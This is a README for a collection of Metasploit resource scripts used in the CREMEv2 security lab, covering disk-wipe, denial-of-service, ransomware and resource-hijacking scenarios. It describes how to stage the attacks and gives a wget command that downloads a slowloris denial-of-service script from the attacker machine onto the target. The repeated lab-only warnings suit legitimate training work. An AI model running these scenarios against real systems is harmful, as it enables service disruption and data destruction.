# CREMEv2 to MSFConsole

A collection of Metasploit resource scripts (`.rc`) adapted for manual use with the CREMEv2 cybersecurity lab. The repository currently includes scenario scripts such as `diskWipe.rc`, `endPointDOS.rc`, `ransomware.rc`, and `resourceHijacking.rc`, together with supporting files in `resourceFile/`.

> **Lab use only:** Run these scenarios only in an isolated CREMEv2 environment that you own or are explicitly authorized to test. Some scenarios can disrupt services or modify/delete data. Take snapshots and use disposable lab machines before testing.

## Recommended environment

Kali Linux is recommended because it is the environment used while preparing and testing these instructions. You will need Metasploit Framework, Python 3, and a configured network between the Kali machine and the CREMEv2 target.

The IP addresses below are examples from one lab setup:

- `192.168.56.191` — the Kali Linux machine's lab-network IP, used as the file server/listener address in examples.
- `192.168.56.181` — the CREMEv2 target in the example topology.
- `8000` — the temporary HTTP file-server port.

**These addresses are not universal.** Check your Kali interface with `ip -br addr` and replace `192.168.56.191` with the Kali IP that the target can reach. `192.168.56.191` is a local network address, not the loopback address `127.0.0.1`.

## Running a scenario manually

The `.rc` files contain Metasploit console commands. For manual execution:

1. Open `msfconsole` on Kali Linux.
2. Open the desired `.rc` file and copy/paste its commands into `msfconsole` **one command at a time**.
3. Read the output after each command and confirm options and sessions before continuing. Session IDs can change between runs; check the current list with `sessions -l` and set the session required by the current module.
4. Do not assume a shell command later in the file automatically runs on the target. Commands such as `wget`, `chmod`, or `python3` must be run in the shell/environment intended by that scenario; a command typed at the Kali prompt runs on Kali, while a command sent through a target session runs on the target.

Manual copy/paste is useful for learning and troubleshooting because it lets you inspect each stage. Do not paste a whole scenario blindly: pause at errors and verify the lab state before proceeding.

## Metasploit RPC (when required)

Metasploit RPC is separate from the HTTP server used to distribute supporting files. If your automation or helper code needs RPC, start `msfconsole` and load the RPC plugin with a strong, temporary password. For example, from the Metasploit prompt:

```text
load msgrpc ServerHost=127.0.0.1 ServerPort=55552 User=msf Pass='REPLACE_WITH_A_STRONG_PASSWORD' SSL=true
```

This example binds RPC to loopback, so clients running on the same Kali machine can connect. Keep RPC local unless you have a specific, secured reason to expose it to another host. Protect the password and do not commit real credentials to this repository.

**RPC is not required just to host files over HTTP or to type commands manually into `msfconsole`.** Use RPC only when the workflow or helper code requires it.

## Hosting files from `resourceFile/`

Some scenario commands download supporting files using URLs such as `http://192.168.56.191:8000/downloads/<fileName>`. For these links to work, copy the required file from `resourceFile/` into the HTTP server's `downloads/` directory.

Run these commands in a **Kali Linux shell**, not at the `msfconsole` prompt. Replace `<fileName>` with the exact filename from `resourceFile/`.

### 1. Create the serving directory

```bash
mkdir -p ~/serve/downloads
```

### 2. Copy the required resource file

Run this from the repository root, or adjust the path to the repository:

```bash
cp resourceFile/<fileName> ~/serve/downloads/
```

For example, to see the available files first:

```bash
ls resourceFile/
```

Confirm the selected file was copied:

```bash
ls ~/serve/downloads/
```

### 3. Start the HTTP file server

```bash
cd ~/serve && python3 -m http.server 8000
```

Leave this terminal open while the lab needs to download files. By default, Python's simple HTTP server listens on all network interfaces. Use it only on an isolated, trusted lab network. To bind specifically to the lab IP instead, run:

```bash
cd ~/serve && python3 -m http.server 8000 --bind 192.168.56.191
```

Replace the IP if Kali uses a different address. Stop the server with `Ctrl+C` when it is no longer needed.

### 4. Build the download URL

A file copied to `~/serve/downloads/local_slowloris.py` is available at:

```text
http://192.168.56.191:8000/downloads/local_slowloris.py
```

The corresponding download command, run from the environment that needs the file, is:

```bash
wget http://192.168.56.191:8000/downloads/local_slowloris.py
```

Replace the filename and IP as needed. `--no-check-certificate` is not needed for an `http://` URL; that option is relevant to HTTPS certificate validation.

## Troubleshooting

- **`Connection refused`:** Check that the Python HTTP server is running, listening on port `8000`, and bound to an interface reachable by the target.
- **`404 File not found`:** Check the filename's spelling/case and confirm the file is in `~/serve/downloads/`.
- **Target cannot reach Kali:** Verify the lab network/interface and confirm the IP used in the URL is the Kali address reachable from the target.
- **Metasploit reports an incompatible session:** Run `sessions -l`, choose a session compatible with the active module, and set its ID explicitly when the module requires a `SESSION` option.
- **A command appears to run on the wrong machine:** Check whether the prompt is a Kali shell, `msfconsole`, or an interactive target session before executing it.

## Safety and cleanup

Keep the lab isolated from production and public networks. Use disposable VMs or snapshots, avoid real credentials/data, and stop the temporary HTTP server and RPC service when testing is complete. Do not expose the HTTP server or Metasploit RPC to untrusted networks.

## References

- [Metasploit RPC API documentation](https://docs.rapid7.com/metasploit/rpc-api)
- [Python `http.server` documentation](https://docs.python.org/3/library/http.server.html)
